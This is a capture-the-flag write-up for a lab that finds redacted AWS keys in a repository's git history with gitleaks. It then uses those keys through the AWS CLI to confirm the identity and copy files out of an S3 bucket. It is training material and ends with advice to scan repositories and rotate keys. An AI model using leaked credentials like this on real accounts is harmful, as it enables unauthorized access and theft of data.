https://app.pwnedlabs.io/labs/hunt-for-secrets-in-git-repos

### Scenario

While conducting OSINT on a lesser-known dark web forum as part of assessing your client's threat landscape, you stumble upon a thread discussing high-value targets. Among the chaos of links and boasts, a user casually mentions discovering an intriguing GitHub repository belonging to your client, the international titan, Huge Logistics. A couple of underground researchers hint at having found something but remain cryptic. Your instincts tell you there's more to uncover. Your objective? Dive deep into this repository, trace any associated infrastructure, and uncover any vulnerabilities before they become tomorrow's headline. The clock is ticking. Will you outsmart the adversaries?

### Information provided

```
GitHub repo link:-

https://github.com/huge-logistics/cargo-logistics-dev
```

### Enumeration

Since we have been provided with only the github repo link, finding all the information from it will be the first step to our exploitation.

We will clone the repository on our local system first:-

```
git clone https://github.com/huge-logistics/cargo-logistics-dev
```

Lets look at the directory structure:-

![](./images/Pasted%20image%2020260923230522.png)

As we can see, there are many files present inside this repository and it is almost impossible to manually look through all these files one by one. 
What we are looking for right now is the presence of any leaked credentials. We will use `gitleaks` which is a very good tool which is used for secrets scanning in many repositories and pipelines.

```
gitleaks detect . -v
```

```

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

Finding:     'key'    => "AKIA<REDACTED>",
Secret:      AKIAWH<REDACTED>
RuleID:      aws-access-token
Entropy:     3.784184
File:        log-s3-test/log-upload.php
Line:        10
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:aws-access-token:10

Finding:     'secret' => "IqHCweAXZOi8WJlQ<REDACTED>",
Secret:      IqHCweAXZOi8WJlQr<REDACTED>
RuleID:      generic-api-key
Entropy:     4.853056
File:        log-s3-test/log-upload.php
Line:        11
Commit:      d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author:      Ian Austin
Email:       iandaustin@outlook.com
Date:        2023-07-04T17:49:13Z
Fingerprint: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:generic-api-key:11

10:42PM INF 4 commits scanned.
10:42PM INF scan completed in 574ms
10:42PM WRN leaks found: 2
```

Here we can see that `gitleaks` has identified two potential secrets inside the repository. Information like the directory, file, author, commit hash, etc has also been provided since we used the `-v` flag for verbose output.

We will use the name of the file and its path to uncover more information about it.

```
log-s3-test/log-upload.php
```

```
git log -- log-s3-test/log-upload.php
```

```
commit ea1a7618508b8b0d4c7362b4044f1c8419a07d99
Author: egre55 <34132245+egre55@users.noreply.github.com>
Date:   Wed Jul 5 17:46:16 2023 +0100

    Delete log-s3-test directory

commit d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Author: Ian Austin <iandaustin@outlook.com>
Date:   Tue Jul 4 18:49:13 2023 +0100

    Initial Commit
```

Here we can see that a total of two commits have been made to this particular file. First commit is by user named `Ian Austin` who has made an initial commit and the second one is `egre55` who has mentioned a comment `Delete log-s3-test directory`

If we take a look at the local copy of repo, there is no such directory present which means it was deleted as mentioned in the comment. However, since we are tracking changes using `git`, the history of all our actions is stored. We will try to uncover this.

![](./images/Pasted%20image%2020260923231302.png)

In the initial commit with hash `d8098af5fbf1aa35ae22e99b9493ffae5d97d58f`, we can see a lot of new information added. To narrow down, lets check the second commit with hash `ea1a7618508b8b0d4c7362b4044f1c8419a07d99`

![](./images/Pasted%20image%2020260923231419.png)

Here we can see the exact lines of code that were deleted!

### Initial foothold

From the information present in the leaks, we can obtain the following information:-

```
AWS ACCESS KEY - <REDACTED>
AWS SECRET ACCESS KEY - <REDACTED>
BUCKET NAME - huge-logistics-transact
REGION - us-east-1
```

Lets configure these credentials in a profile named `git_hunt`

```
aws sts get-caller-identity --profile git_hunt
```

```
{
    "UserId": "AIDAWHEOTHRF24EMR3SXJ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/dev-test"
}
```

We have successfully logged into one of the users!

### Data exfiltration

We will use the clues of the bucket name and region present in the deleted lines of code inside the commit history and list the contents of S3 bucket.

```
aws s3 ls s3://huge-logistics-transact --profile git_hunt
```

```
2023-07-05 21:23:50         32 flag.txt
2023-07-04 22:45:47          5 transact.log
2023-07-05 21:27:36      51968 web_transactions.csv
```

Here we can see that the `flag.txt` file is present in plain sight.

```
aws s3 cp s3://huge-logistics-transact/flag.txt - --profile git_hunt
```

```
fe108d6a<REDACTED>
```

There we have the flag! It is important to note from this lab that, even though the credentials were not present in the current state of the `github` repository, they can still be present if you had once placed them inside the remote repository in the form of commit hashes and history. We should use tools like `gitleaks` to periodically scan the repos and rotate the credentials immediately in case of public exposure.
